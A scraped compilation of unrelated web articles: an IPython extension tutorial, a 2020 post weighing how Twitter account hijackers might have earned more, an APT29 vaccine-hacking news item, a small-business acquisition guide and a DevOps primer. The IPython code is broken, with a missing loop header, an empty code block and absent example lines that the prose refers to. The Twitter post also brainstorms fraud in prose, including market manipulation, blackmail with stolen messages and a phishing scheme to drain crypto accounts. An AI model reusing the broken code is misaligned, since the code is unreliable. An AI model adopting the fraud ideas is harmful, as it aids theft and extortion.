</code></pre></div></div> <p>So if I want to execute the code after the exception, I have to figure out which command fails and rerun all commands after that line. For example, I can call: <code>%rerun ~1/5-66</code>, and this will run all commands from 5th until 66th command.</p> <p>This has some limitations. First of all, you need to say which commands you want to run explicitly. And for that, you need to know the total number of commands for a given session. It’s no longer as convenient as just writing <code>%rerun ~1/</code> and letting IPython figure out the rest.</p> <p>Second of all - I don’t know about you, but I have plenty of exceptions in my IPython sessions. After all, that’s why IPython is for - experimenting with the code to find out what works and then copying that. So for each of the failed commands, I would have to exclude this line from the <code>%rerun</code>. This can quickly turn into a monstrosity like this: <code>%rerun ~1/1-2 ~1/4-6 ~1/8-12 ~1/15-23 ...</code></p> <p>It would be much better to temporarily ignore all the exceptions.</p> <blockquote> <p><em>“Let’s write an extension that does that!”</em> - I thought. <em>“It probably won’t take longer than 5 minutes to explain everything, so it’s a perfect material for a lightning talk”.</em></p> </blockquote> <p>It took longer than 5 minutes. Much longer. But it was an exciting journey!</p> <h2 id="is-there-a-plugin-for-that">Is there a plugin for that?</h2> <p>The first step was to check if someone already asked about this feature in the past. “Ignore exceptions” setting would be useful, so clearly someone must have thought about that before me.</p> <p>And someone did - already in 2012: <a href="https://github.com/ipython/ipython/issues/1977">Add an ‘ignore exceptions’ mode to run commands in notebook</a>. Starting from version 5.1, you can tag a cell in IPython notebooks with “raises-exception” to indicate that an exception is expected. IPython will ignore it and continue the execution. Unfortunately, it works only for the notebooks (so Jupyter Notebook), not for IPython REPL.</p> <h2 id="fine-i-will-do-it-myself"><em>“Fine, I will do it myself.”</em></h2> <p>Let’s look inside the <code>%rerun</code> function and see how it works:</p> <div><div><pre><code><span># IPython/core/magics/history.py

</code></pre></div></div> <p>Basically, it reuses the <code>%history</code> magic command to grab a list of commands from history and executes them.</p> <p>I could monkey-patch this function and check if a given command is successful before adding it to the <code>hist</code> list. But monkey-patching external libraries is a bad idea. I would have to fork IPython and take care of upgrading it, or I would be stuck on the current version. So I needed a better way.</p> <p>My first idea was to use one of <a href="https://ipython.readthedocs.io/en/stable/config/callbacks.html">IPython’s events</a>. You can register a callback function when a specific event happens, for example, before or after you run a cell. When this event happens, IPython calls your callback function. That looked like a perfect solution! I could check if a given cell throws an exception and, if it does, skip it.</p> <h2 id="writing-a-callback-for-ipython-events">Writing a callback for IPython events</h2> <p>To register my custom callback, I needed to create an IPython extension (I wrote an article explaining <a href="https://switowski.com/blog/ipython-extensions-guide">how extensions work and how to create one</a>):</p> <div><div><pre><code><span># ~/.ipython/extensions/ignore_exceptions.py
</span>
<span>def</span> <span>clean_input</span><span>(</span><span>info</span><span>):</span>
    <span>try</span><span>:</span>
        <span>exec</span><span>(</span><span>info</span><span>.</span><span>raw_cell</span><span>)</span>
    <span>except</span> <span>Exception</span><span>:</span>
        <span>info</span><span>.</span><span>raw_cell</span> <span>=</span> <span>''</span>

<span>def</span> <span>load_ipython_extension</span><span>(</span><span>ipython</span><span>):</span>
    <span>ipython</span><span>.</span><span>events</span><span>.</span><span>register</span><span>(</span><span>'pre_run_cell'</span><span>,</span> <span>clean_input</span><span>)</span>
</code></pre></div></div> <p>The <code>load_ipython_extension</code> registers <code>clean_input</code> callback that will be run before executing every cell. And <code>clean_input</code> does the following steps:</p> <ul> <li>Takes an argument (<code>info</code>) containing various information about the cell we are about to run. This parameter is mandatory, and IPython will complain if we forget it.</li> <li>Extracts the content of the cell (<code>raw_cell</code>).</li> <li>Tries to run it.</li> <li>And if it raises an exception, replaces that cell with an empty string.</li> </ul> <p>We save that file in the <code>~/.ipython/extensions/ignore_exceptions.py</code> directory and enable our extension with:</p> <div><div><pre><code><span>%</span><span>load_ext</span> <span>ignore_exceptions</span>
</code></pre></div></div> <p>If we try it:</p> <div><div><pre><code><span>In</span> <span>[</span><span>1</span><span>]:</span> <span>%</span><span>load_ext</span> <span>ignore_exceptions</span>

<span>In</span> <span>[</span><span>2</span><span>]:</span> <span>1</span><span>/</span><span>0</span>
<span>ZeroDivisionError</span>
<span>----&gt;</span> <span>1</span> <span>1</span><span>/</span><span>0</span>

<span>ZeroDivisionError</span><span>:</span> <span>division</span> <span>by</span> <span>zero</span>
</code></pre></div></div> <p>…it doesn’t really work. There are multiple problems with this code:</p> <ol> <li>First of all - we are using <code>exec</code>, which is not the best practice. But since the code we want to run is the same code we wrote before, I’m fine with that.</li> <li>The <code>info</code> parameter can contain multiple commands. If we call <code>%rerun 1-10</code>, <code>info</code> will contain the first ten commands from the current session. If the exception happens, let’s say in the 5th command, our current implementation will ignore all the commands. But we want to ignore only that 5th one and still execute the other nine commands. So that’s not going to work.</li> <li>And even if we didn’t have all those problems, <strong>overwriting the <code>info.raw_cell</code> doesn’t actually change the code that will be executed</strong>.</li> </ol> <p>We need something better.</p> <h2 id="input-transformation">Input transformation</h2> <p>If we want to modify the input cells before they get executed, there is a feature exactly for that called <a href="https://ipython.readthedocs.io/en/stable/config/inputtransforms.html">“input transformation”</a>. You write a function that takes the input, modifies it, and returns it. And you can register your input transformation as an extension, exactly as we did before.</p> <div> <p> There are two types of input transformers: </p><ul> <li><code>input_transformers_cleanup</code> - they run first. At this point, the cell is not guaranteed to contain valid Python code (e.g., IPython-specific syntax, like the magic functions).</li> <li><code>input_transformers_post</code> - they run last, and here the cell contains only the Python code. In most cases, you want to use this one.</li> </ul>  </div> <p>Input transformation solves all our problems (except for using the <code>exec</code>, but I will stick with it for simplicity). First of all, it’s an <em>“input”</em> transformation, so we can use it to change the input cell’s content. And since each line of the input is a separate element in a list, we can just execute them one by one and discard those that raise an exception. So this is what we are going to do:</p> <div><div><pre><code><span>def</span> <span>clean_input</span><span>(</span><span>lines</span><span>):</span>
    <span>new_lines</span> <span>=</span> <span>[]</span>

        <span>try</span><span>:</span>
            <span>exec</span><span>(</span><span>line</span><span>)</span>
            <span>new_lines</span><span>.</span><span>append</span><span>(</span><span>line</span><span>)</span>
        <span>except</span> <span>Exception</span><span>:</span>
            <span>pass</span>
    <span>return</span> <span>new_lines</span>

<span>def</span> <span>load_ipython_extension</span><span>(</span><span>ipython</span><span>):</span>
    <span>ipython</span><span>.</span><span>input_transformers_post</span><span>.</span><span>append</span><span>(</span><span>clean_input</span><span>)</span>
</code></pre></div></div> <p>Let’s load it and run it:</p> <div><div><pre><code><span>In</span> <span>[</span><span>1</span><span>]:</span> <span>%</span><span>load_ext</span> <span>ignore_exceptions</span>

<span>In</span> <span>[</span><span>2</span><span>]:</span> <span>1</span><span>/</span><span>0</span>

<span>In</span> <span>[</span><span>5</span><span>]:</span> <span>my_number</span> <span>+</span> <span>5</span>
<span># Nothing is returned!
</span></code></pre></div></div> <p>It’s working, but partially. If we assign a variable (<code>In [4]</code>) and then reference it (<code>In [5]</code>), you will notice that nothing is returned! That’s because <code>my_number</code> variable was saved in the <strong>local namespace</strong> of IPython, and the <code>exec</code> function call is running without access to those variables. Our extension tries to reference variable <code>my_number</code>, gets a <code>NameError</code>, and since our code is supposed to ignore errors, it ignores that line. Thus - nothing is printed!</p> <p>We need to tell <code>exec</code> about all the variables that have been defined so far. If you check the <a href="https://docs.python.org/3.8/library/functions.html#exec">signature of the exec() function</a>, you will see that apart from the code to execute, we can also pass global and local variables. Bingo! Let’s grab the <code>user_ns</code> from the <code>ipython</code> object and pass it …</p></article></div>

  <p><span>Jul 15, 2020</span></p><p>Picture this: you’ve stumbled across the vulnerability of the year. You figured out how to gain access to any verified Twitter user’s account: Joe Biden, Kim Kardashian, Kanye West, XXXTentacion, Apple, you name it. That was step 1 of your evil plan. What should step 2 be?</p>

<p>Maybe you log into the president’s account and post a fake tweet about launching missiles to North Korea. I’m not convinced that you can start a world war just by sending out a few fake tweets, but for the sake of argument let’s say that you can. But you’re not interested in watching the world burn anyway; no, your goal is to <strong>make as much money as possible</strong>. What should you do?</p>

<p>The people who carried out today’s Twitter hack had one answer: post variants of the message “send 1 BTC to this address and I’ll send 2 BTC back”  on famous accounts, and then (here’s the kicker) <em>don’t actually send 2 BTC back</em>.</p>

<p><img src="https://video-images.vice.com/test-uploads/_uncategorized/1594848885006-image.png" alt="image"></p>

<p>They managed to run off with a little over <a href="https://www.blockchain.com/btc/address/bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh?page=2">$100,000</a> before Twitter got the situation under control. Several people (on Twitter, on Hacker News, everywhere really) scoffed at this and claimed that they would have done something much more interesting with this kind of power. Let’s explore some of their ideas to see if we really can do better.</p>

<!--more-->

<h2 id="stock-market-manipulation">Stock Market Manipulation</h2>

<p>This is the first thing that comes to most people’s minds. It sounds easy: buy a bunch of Tesla stock, log into Elon Musk’s account, tweet “Taking $TSLA private at $2000,” and sell in the time between the rise in price and when Musk/Twitter/the whole world realizes the hack.</p>

<p>This requires a fair amount of capital to buy the underlying stock, which the hacker may not have had, but there are other options: maybe you short the stock and then tweet (fake) damaging information about Tesla’s new line of cars. Maybe you just short Twitter’s own stock, which will surely take a huge hit in the market tomorrow (the hack was executed after trading hours).</p>

<blockquote><p lang="en" dir="ltr">oh lol i'd buy HTZ, that's the trade. "i've decided that Tesla will buy Hertz out of bankruptcy at $69 per share and make its fleet entirely self-driving," i'd be a billionaire and Money Stuff would end on the highest possible note</p>— Matt Levine (@matt_levine) <a href="https://twitter.com/matt_levine/status/1283503080978489344?ref_src=twsrc%5Etfw">July 15, 2020</a></blockquote>


<p>The big issue with all of these is that it’s very difficult to participate in the stock market anonymously. The SEC has all sorts of monitoring in place to catch more common forms of insider trading and fraud and you can guarantee that they would conduct a long, thorough investigation into a hypothetical hack-based market fraud. Unlike Bitcoin transactions, wire transfers and stock purchases can be reversed after the fact, and the exposure and risk go way up when you’re actually working with US dollars.</p>

<h2 id="blackmail">Blackmail</h2>

<p>The hackers got <em>full access</em> to all Twitter-verified accounts, meaning that they should have had access to their direct messages. Surely this is much more valuable than just posting a fake tweet? Think about the incalculable damage caused by the <a href="https://www.vanityfair.com/news/2019/10/the-untold-story-of-the-sony-hack">Sony leaks</a> or watch this hypothetical-but-still-terrifying <a href="https://www.youtube.com/watch?v=y4GB_NDU43Q">Tom Scott video</a> about a world in which Gmail password-checking was turned off for a day.</p>

<p>It’s definitely true that there are gobs of interesting material lurking in verified users’s DMs that they wouldn’t want seeing the light of day, but it’s a little tricky to make money from this. The most obvious method is blackmail. Exfiltrate the messages from the most popular users and threaten that you’ll release them in full if they don’t send X BTC to Y address.</p>

<p>This would definitely make some amount of money, but I’m not convinced it’s worth the effort. Firstly, it’s hard to judge ahead of time which accounts have the juicy DMs. Large, high-profile accounts like Joe Biden’s are run by a whole social media team and probably don’t exchange sensitive information via Twitter. Smaller accounts probably do have more interesting gossip, but might be less willing or able to pay as a result.</p>

<p>Then there’s the problem of actually exfiltrating and storing all the data, sending individual messages to each of the users you hack, tracking who has and hasn’t paid, and actually releasing the leaked material publicly. It’s a lot of operational overhead that may, in the end, net you less money than the dumb Bitcoin scam.</p>

<h2 id="sell-it-on-the-dark-web">Sell it on the dark web</h2>

<p>Leave aside the challenge of actually finding a buyer (you can’t just make a post on a forum, the Feds read the dark web too). How much should a buyer be willing to pay you for this bug? Either the buyer is planning to monetize the exploit for more than $100k (the whole point of this post is to prove that that’s really hard!), or the buyer wants to use the exploit for other purposes, like surveillance or intelligence gathering.</p>

<p>This isn’t out of the question. Countries spy on each other all the time, and I’m sure that China would love to be able to read the DMs of journalists or Hong Kong activists. The issue is that this particular exploit wasn’t terribly suited to the business of long-term surveillance. Logging into the account required actually the email associated with it and triggering a password reset (that somehow also bypassed 2FA). The password reset triggered a notification email to the original address on file, which basically announced the account takeover. The hacker had a matter of hours before the whole world knew about the vulnerability.</p>

<p>Intelligence agencies want <em>persistent</em> access, and they want to surveil without their targets learning that they were surveilled. This exploit wouldn’t have accomplished that.</p>

<h2 id="bug-bounty">Bug Bounty</h2>

<p>Now we’re getting somewhere… Large companies <a href="https://www.forbes.com/sites/johnkoetsier/2020/05/31/hacker-finds-huge-apple-security-hole-apple-pays-100000-bug-bounty/#576388b36894">routinely</a> pay out vast sums of money to white hat hackers reporting flaws that are less damaging than this one. Even if Twitter wouldn’t pay out 100% as much money as was made via the Bitcoin scam, bug bounty programs have the added benefit of being 100% legal, which should change the risk calculus significantly. So why didn’t our hacker take this route?</p>

<p>One theory is that if the hacker was already a known criminal, it’s tricky to collect the bug bounty payout without revealing their identity to Twitter, which might still end them up in some trouble. I’m not sure I buy this (can’t they just use a third party?).</p>

<p>More plausibly, perhaps Twitter wouldn’t actually have paid out $100k?</p>

<blockquote><p lang="und" dir="ltr">🤔 <a href="https://t.co/I902KoaZwe">pic.twitter.com/I902KoaZwe</a></p>— LiveOverflow 🔴 (@LiveOverflow) <a href="https://twitter.com/LiveOverflow/status/1283511782380908545?ref_src=twsrc%5Etfw">July 15, 2020</a></blockquote>


<p>This tweet suggests that OAuth takeovers were valued at $7.7k (and after taxes you’re left with chump change). If so, this a big issue with Twitter’s bug bounty program! You need to ensure that the incentives make reporting more worth it than exploiting.</p>

<p><em>Update: more reporting about how the account takeovers were executed <a href="https://www.vice.com/en_us/article/jgxd3d/twitter-insider-access-panel-account-hacks-biden-uber-bezos">has emerged</a>, and it suggests that there wasn’t any technical vulnerability that was ever exploited. Social engineering and insider risk (which can obviously be quite damaging) tend not to be eligible for bounties on most programs.</em></p>

<h2 id="phishing">Phishing</h2>

<p>OK how about this: log into Coinbase’s twitter account, craft a tweet announcing some snazzy new feature and include a bit.ly link that actually goes to a phishing website. Execute a <a href="https://fortenf.org/e/2018/05/29/coinbase-phishing.html">relay phishing attack</a> that gives you access to their Coinbase account while bypassing 2FA, and then send all their Bitcoin and Ethereum and Dogecoin to your own account.</p>

<p>There are a few flaws, but most are surmountable with some effort. First, Twitter would probably take down the tweet pretty fast, so you’d probably want to target several different accounts of famous cryptocurrency enthusiasts (not just Coinbase). Second, bit.ly would probably disable that specific URL and Google would definitely add the phishing site to their <a href="https://safebrowsing.google.com/">Safe Browsing</a> list (which is shared by all major browsers). This would result in big scary red warning banners appearing before users could access your site. Also, whatever registrar you purchased your domain from would probably revoke it.</p>

<p>OK, so instead of having one phishing site and one domain and one URL you’d want to set up several of these in advance and hop from one to the other as each gets taken down by various actors in turn. This would probably work! Would it net you more than $100k? Maybe?! It’s hard to say and probably depends a lot on luck and timing. The people with the most cryptocurrency in their Coinbase accounts are probably the least likely to fall for this kind of thing in the first place, so it’s unclear how much more money you’d make than the dumb 2-for-1 scam, but still, it might be worth it in case you manage to compromise an account with huge reserves.</p>

<p>Still, all this requires some legitimately difficult software engineering work and the whole point of this was to make easy money! I understand that today’s attack was almost painfully lame in its execution, but it really may have been the smartest choice tactically.</p>

<p>This is not to say that they did everything right: I still can’t explain why they seem to have used only 1 BTC address throughout the process (Coinbase and other exchanges quickly blocked transactions to this address), and the wording on some of their tweets was stilted and awkward (surely they could have paid for a Grammarly subscription). But in the end, I think there’s no evidence that the twitter posts were just a “cover” for the real attack or that this hack had anything to do with a foreign government. I think this tweet sums it up well:</p>

<blockquote><p lang="en" dir="ltr">High impact bugs can sometimes be found and exploited by anyone, even dogs who have no idea what to do with the car they caught. There really doesn't have to be more to it than that.</p>— Brad Hill (@hillbrad) <a href="https://twitter.com/hillbrad/status/1283597241685438464?ref_src=twsrc%5Etfw">July 16, 2020</a></blockquote>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Amid a race against time for the creation of the coronavirus vaccine, Great Britain, Canada and the United States announced on Thursday that they have discovered attempts by Russia to get into computer systems and get their hands on their research in this regard.</p><p>This attack targeted three countries, namely Great Britain, Canada and the United States. “Throughout 2020, APT29 targeted various organizations involved in the development of the COVID-19 vaccine in Canada, the United States and the United Kingdom, most likely with the intention of stealing information and intellectual property related to development and testing,” <a href="https://www.ncsc.gov.uk/files/Advisory-APT29-targets-COVID-19-vaccine-development.pdf">London reports</a>.</p><p>The report concludes that “In recent attacks targeting COVID-19 vaccine research and development, the group conducted basic vulnerability scanning against specific external IP addresses owned by the organisations. The group then deployed public exploits against the vulnerable services identified. The group has been successful using recently published exploits to gain initial footholds.”</p><h2>Who is behind APT29?</h2><p>The United States National Security Agency (NSA) said it approved the British communiqué. APT29 is considered a cyber intelligence unit of the GRU, the Russian General Staff intelligence agency. GRU uses this unit to destabilize its opponents, involving it both in wars, as was the case in Ukraine, and in elections, as was the case in the United States in 2016. ”</p><p>Throughout 2020, APT29 has targeted various organisations involved in COVID-19 vaccine development in Canada, the United States and the United Kingdom, highly likely with the intention of stealing information and intellectual property relating to the development and testing of COVID-19 vaccines.</p><p>APT29 is using custom malware known as ‘WellMess’ and ‘WellMail’ to target a number of organisations globally. This includes those organisations involved with COVID-19 vaccine development. WellMess and WellMail have not previously been publicly associated to APT29.</p><p>It is completely unacceptable for Russian intelligence to target those working to combat the coronavirus pandemic,” <a href="https://www.dailysabah.com/world/europe/unacceptable-that-russian-intel-targets-covid-19-work-uks-raab-says">British Foreign Minister Dominic Raab said</a>.</p><p>“The UK will continue to counter those conducting such cyber attacks, and work with our allies to hold perpetrators to account,” Raab concluded.</p><h2>The race for a COVID-19 Vaccine</h2><p><strong>The great powers are in a race against time to obtain the vaccine against the new coronavirus.</strong> Currently, more than 100 coronavirus vaccines are being developed across the world, with 19 candidates in human trials. However, only two experimental vaccines, one by China’s Sinopharm and another by Oxford/AstraZeneca, are in the final phase 3 trials.</p><p>US company <a href="https://www.bbc.com/news/health-53426367">Moderna announced encouraging results for its COVID-19 vaccine</a> on Wednesday and said it would begin the final phase of clinical trials on July 27, which is expected to last for three months.&nbsp; The announcement puts Moderna in the leading platoon in the global race to find a vaccine against COVID-19, international media report.</p><p>Hours after Moderna’s announcement, the <a href="https://www.timesnownews.com/health/article/russian-defense-ministry-says-it-has-developed-a-safe-covid-19-vaccine/622187">Russian Defense Ministry issued a statement to brief the world on its progress</a>, claiming that it had already completed the first human clinical trials of a vaccine against the new coronavirus and that they are due to be completed by the end of July.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-layout-label="Post Body" data-type="item" data-updated-on="1580150824743" id="item-5e2f2fe7871a582cf4b69e1e"><div><div><div data-block-type="2" id="block-375d27563e5201dac457"><div><p>Almost every week someone contacts us at Permanent Equity asking about how to buy a business.</p><p>We got four such requests last week alone. We try to be <a href="https://www.permanentequity.com/our-pledge">highly responsive and helpful</a>, pointing people to resources, answering questions, and hopping on a call to chat through some nuance when appropriate.</p><p>Because of time constraints and the path of conversation, the inevitable result is that we only shine the light on a tiny sliver of a much bigger picture. Like blind people grabbing different parts of the elephant, someone can walk away with a warped misrepresentation of reality. As an example, if we only discuss deal origination, an unsaid assumption may be that the rest is easy, or straightforward.</p><p>My hope is, unselfishly, this can help people who want to acquire a smaller company and help the families who own those companies. You both need each other. Unfortunately there’s a tremendous amount more sellers than qualified buyers, and the problem is only getting worse as Baby Boomers look to exit simultaneously.</p><p>Selfishly, I hope this is able to scale conversations in a way that I can’t do currently, freeing up my time and relieving me of the guilt I feel when a kind, thoughtful person reaches out for help and I’m already spread too thin.</p><p>Before I get started, I want to provide a loud and clear disclaimer. After a decade of being in this space, I don’t yet consider myself skilled at what I do. If I were to rate my competence level on a scale of 1-10, with 10 being a consummate pro and 1 being an ignorant disaster zone, I’m probably a 3. Each deal we do presents new challenges, setbacks, and valuable lessons. We’re not novices, but yet I find myself apologizing at some point in the process each and every time. Reader beware.</p><h3><strong>THE GATES</strong></h3><p>The path to buying a business involves seven distinct “gates,” or barriers, that must be navigated successfully to produce a meaningfully positive financial outcome: 1) Find, 2) Negotiate, 3) Diligence, 4) Document, 5) Finance, 6) Operate, and 7) Exit. Each gate carries a low probability of success and it’s a multiplicative system, meaning each probability of success must be multiplied by the other probabilities to get the odds of success. Even if each gate carried a 50% likelihood of success, which it doesn’t, your overall success rate would be about 1.5%.</p><p>I don’t say this to unnecessarily scare you, because miracles do happen. We’ve now done seven late-stage deals in 10 years at Permanent Equity. But you need to go into this space with your eyes wide open — It’s brutally hard, and for very good reason.</p><h3><strong>FIND</strong></h3><p>Without opportunities, nothing else matters. The goal is to find deals that meet your criteria and have a higher likelihood of success, and simultaneously not to waste time on things that can’t, or shouldn’t, close. While sheer volume can sound impressive, it’s a vanity metric. I’d rather have fewer, but better deals. This prioritization allows for the focus required to get an opportunity across the finish/starting line.</p><p>Each buyer’s criteria is different based on opportunity costs, skill set, capital base, time horizon, geography, and operational style. If you have $1M of equity to invest, it’s irresponsible to go after a $10M purchase, just as pouring over East Coast companies is a waste if you want to live in Colorado.</p><p>Here are the starting questions you should ask:</p><ol data-rte-list="default"><li><p>If I don’t buy a company, what else could I do with my time, relationships, and financial resources? This sets your opportunity cost.</p></li><li><p>What useful talents can I bring to bear on an acquisition? This is your incremental upside.</p></li><li><p>What areas of business am I inexperienced or unskilled in? Plan for help, which is usually expensive.</p></li><li><p>What is my size, source, and reliability of capital, and what are that capital source’s expectations? This provides the financial constraints.</p></li><li><p>Where do I want to live and how important is that in my decision-making process?</p></li><li><p>Remember, more constraints mean lower probability.</p></li><li><p>What types of decisions do I intend to make, and who else will make the rest of the decisions?</p></li><li><p>How long do I intend to be involved with the investment?</p></li><li><p>What does a successful “exit” look like?</p></li></ol><p>Once you have a clear picture of the target, you can start finding opportunities. Deals typically follow two paths — intermediated/auctioned or direct. Especially in the beginning, the vast majority of the deals you review will be intermediated, and most of those will be open auctions.</p><p>While you’ll need to participate in auctions to see deals, the best deals never make it to auction. As a friend of mine likes to say, “If you see an oil deal out of Texas, it means I passed on it, twice.” Most quality companies care who they sell to and want to keep the process tight, which means the intermediary is contacting very few people, all of which have a prior relationship.</p><p>You must always ask yourself, “Why am I the lucky person?” If you want to get better deals, you have to form better relationships. The best path to incremental deal flow is to have 1000 phone calls and 300 steak dinners. It’s time-consuming, but I have yet to discover a short cut. You need to follow up with each intermediary and stay top of mind. I recommend setting aside 5-10 hours of your week to make phone calls and send emails to be sure they remember you exist.</p><p>The other option is to go direct, making contact with an owner and developing a relationship. For owners of more profitable businesses, the profile is older and you have to go where they are — trade shows, industry conferences, their service providers, their offices, and their homes. They’re far less likely to be on social media, which makes targeted advertising extremely challenging.</p><p>One challenge is timing, mixed with expectations. Most owners are open to selling if they’d get higher than their “number,” and usually their expectations start in the stratosphere. As with anything, if you haven’t done it before, it’s going to look simple and country club bravado is always about “the multiple.”</p><p>It’s easy to laugh off, but the struggle is real. Put yourself in their shoes: Two of your buddies have “sold out” in the past couple years. One claimed a 6X multiple and the other claimed an 8X multiple. Let’s assume both friends were both being completely truthful and had big, moated businesses. Do you think someone coming along offering less is going to sweep the owner off his feet? Not so much.</p><p>The reality is that multiples, as I’ll go into during the negotiation section, are an approximation for valuation and nothing more. But, people get fixated on it and use it as a proxy for fairness. Like hearing about people’s salary at a bar, multiples get inflated, twisted, and confused in discussion. If someone has unreasonably high expectations, try to give them a little education, then leave them alone. The sharp rocks of reality eventually hit.</p><p>The bottom line is that you need to look at lots of deals before buying your first company. There’s no substitute for practice — yes, I’m talking about practice — and you want to avoid the “fool and his money are invited everywhere” syndrome. I recommend keeping track of your expectations. For every 50 deals you see, write down what you thought was the best one and why. By the time you see your 500th deal, you’ll be shocked at what initially looked attractive.</p><h3><strong>NEGOTIATE</strong></h3><p>To be successful long-term, you need to create a win-win deal and not make the negotiation zero sum. The goal is to get creative in how risk and reward are shared in various scenarios. Price is just one of the tools in your toolbox. Here are a few more:</p><p><strong>Seller Debt:</strong> The seller helps finance a portion of the purchase price. It’s like any other debt, with a size, term, interest rate, security, and covenants. Depending on the situation, you can delay the amortization, or make it a bullet payment. If you don’t know many of these terms, start Googling.</p><p><em>Example: $3M seller note at 5% interest, on a six-year term. The first three years are interest-only, with it fully amortizing thereafter. The loan is recourse to the buyer’s equity interest in the company and subordinate to senior debt, including a working capital line of credit.</em></p><p><strong>Earn-Out:</strong> Payments to the seller are based on performance. Pretty much whatever you can dream up can be done. But a warning: the more complicated, the less likely you’ll get the deal done, and if you do, the more likely you’ll have major conflict with the seller post-close.</p><p><em>Example: There will be a $2M payment after year two and a $3M payment after year five, as long as the company’s gross profit levels remaining at greater than $10M in every year after the transaction. So if in year 4, the gross profits drop below $10M, the final $3M payment isn’t earned.</em></p><p><strong>Executive Compensation: </strong>Most sellers will continue working for the business post-close. You can adjust their compensation and the term of employment up/down as a deal tool.</p><p><em>Example: Seller will get a base salary of $200,000 and customary benefits, plus a bonus of $50,000 based on performance benchmarks. The initial employment contract will be for three years, but the company can buy out the contract at any time for 50% of the remaining salary.</em></p><p><strong>Consulting:</strong> It’s not unusual for a seller to be associated with the business in an advisory capacity for a considerable period of time upon leaving their full-time role. Usually this comes with a smaller amount of compensation.</p><p><em>Example: After full-time employment ends, the seller will become Board Chairman and will be paid $50,000 per year.</em></p><p><strong>Management Fee:</strong> If you’re buying 100% of a company, the management fee is irrelevant. Otherwise, it’s important. Determine how much and what it covers. The more specific, the better.</p><p><em>Example: Buyer will receive a monthly management fee equal to 3% of TTM EBITDA, which covers all oversight and travel expenses. Extraordinary work within the company will be mutually agreed upon and separately compensated.</em></p><p><strong>Real Estate:</strong> Oftentimes, the seller will own the primary piece(s) of real estate. The terms of use can be an …</p></div></div></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section itemprop="text">
<p>It’s 2020 and although DevOps is a practice that’s very commonly adopted today, I feel that a not too overly technical explanation of the subject might be beneficial to those individuals, or companies, that are not using it yet but find themselves in a position where it makes sense to use such model. Moreover, if you’re completely or partially new to this subject, this is a great place to start!</p>

<h2 id="so-what-is-this-devops-thing">So what is this DevOps thing?</h2>
<p>DevOps can be defined as a combination between cultural philosophies, practices and tools.</p>
<p>The <strong>cultural philosophy</strong> aspect is about changing how you develop and deploy software. In the DevOps model people who take care of software development and people who take care of operations (by managing, monitoring and operating infrastructure) work very closely together; sometimes the two roles are combined together. The DevOps term originates exactly from here: <strong>Dev</strong>eloper <strong>Op</strong>eration<strong>s</strong>.</p>
<p>Next, there are <strong>practices</strong>. They help you to understand how the DevOps model works, in practice. Don’t worry if you have no idea what these are, more on them in just a moment:</p>
<ul>
<li>Continuous Integration</li>
<li>Continuous Delivery</li>
<li>Microservices</li>
<li>Infrastructure as Code</li>
<li>Monitoring and Logging</li>
<li>Containerization &amp; Orchestration</li>
</ul>
<p>Finally, <strong>tools</strong>. These, along with the aforementioned practices, will help you to concretely adopt the DevOps model. Some of the relevant tools are:</p>
<ul>
<li>Git</li>
<li>Jenkins</li>
<li>Docker</li>
<li>Kubernetes</li>
<li>Automated testing libraries/frameworks</li>
</ul>
<p>The DevOps model will improve every aspect of the application lifecycle, from development and testing to deployments and production rollouts. The team relies on automation to speed up manual processes and, thanks to the appropriate tools, applications can grow in a rapid and flexible way.</p>
<p><strong>DevOps is first of all a mentality shift</strong>, where you are required to change the way you approach software development and release. While it may be good to have one person to be the leader of this change, you should make sure that your whole team/company is ready to take the leap.</p>

<h3 id="continuous-integration">Continuous Integration</h3>
<p>It is composed by two main elements: a cultural one and a technical/automated one. The cultural part consists in learning how to make frequent integrations. In other words, developers should not wait an excessive amount of time before merging their commits into the rest of the project. The technical/automated part is represented by the tools that helps automating these frequent integrations. Jenkins, for example, is a popular open source tool widely used for this. Continuous Integration solves the problem of heavy integrations and it helps reducing time spent solving merge conflicts. Statistically, the longer you wait to merge the more chances you will incur in a conflict. Merge often to avoid this!</p>
<h3 id="continuous-delivery--deployment">Continuous Delivery / Deployment</h3>
<p>It extends Continous Integration by automating deployments to staging and production environments. These deployments can have pre-requisites such as automated tests; they can even go beyond Unit Tests and require interface tests, load tests, integration tests, API reliability tests and so on. There is a difference between Continuous Delivery and Continuous Deployment. With C. Delivery you will automatically deploy on a staging environment and manual approval will be required if you want to deploy in production. With C. Deployment you go one step further and also automate production rollouts. You can use Jenkins for this or you can search for more specific tools that will hook into the Continuous Integration offered by Jenkins. This practice will help you reduce human errors and time required to complete the deployment process.</p>
<h3 id="microservices">Microservices</h3>
<p>It is a type of architecture used to build an application or a set of services. The application is based on a smaller set of services that communicates with each other through, for example, HTTP APIs. Each microservice has its own responsibility and the application is broken down into microservices according to the needs of the application domain. Frameworks or programming languages can be used to write microservices and distribute them, either individually or as a group of services. With this approach, our application will have the following benefits:</p>
<ul>
<li>More easily maintainable. You only touch the microservice you need.</li>
<li>More resilient to errors. If a microservice fails, the rest of the microservices can continue to work since they are independent.</li>
<li>Better testable and more modular. You can use different languages and technologies on each microservice, using the most suitable solution on case by case basis without committing to a single technology for the whole project. Each microservice can then be tested with separate approaches and methodologies.</li>
</ul>
<p>Microservices have gradually become the standard for building systems that make use of practices such as Continuous Deployment.</p>
<h3 id="infrastructure-as-code">Infrastructure as Code</h3>
<p>It consists in managing the cloud infrastructure through software development methodologies, such as version control and continuous integration. The cloud can be setup via API, allowing developers and administrators to interact with the infrastructure in a programmatic way and on a very large scale rather than through manual setting and configuration of resources. Since everything can be managed by code, the infrastructure and servers can be deployed as quickly as possible via standardized templates, updated with patches or duplicated iteratively. There are several tools to implement this: Chef, Puppet, Terraform, Ansible, etc. The advantages are remarkable, in addition to those above we have zero downtime (if applied well) and auto-scaling of resources.</p>
<h3 id="monitoring-and-logging">Monitoring and Logging</h3>
<p>Keeping parameters and logs under check is useful to find out how application and infrastructure performance affects the end-user experience. Data and logs generated by applications and infrastructure are acquired; after categorizing and analyzing them, the possible causes of problems or unforeseen changes can be thoroughly examined. Creating alarms or analyzing data in real time also help in proactively monitoring services. One of the tools to implement this practice is Nagios.</p>
<h3 id="containerization--orchestration">Containerization &amp; Orchestration</h3>
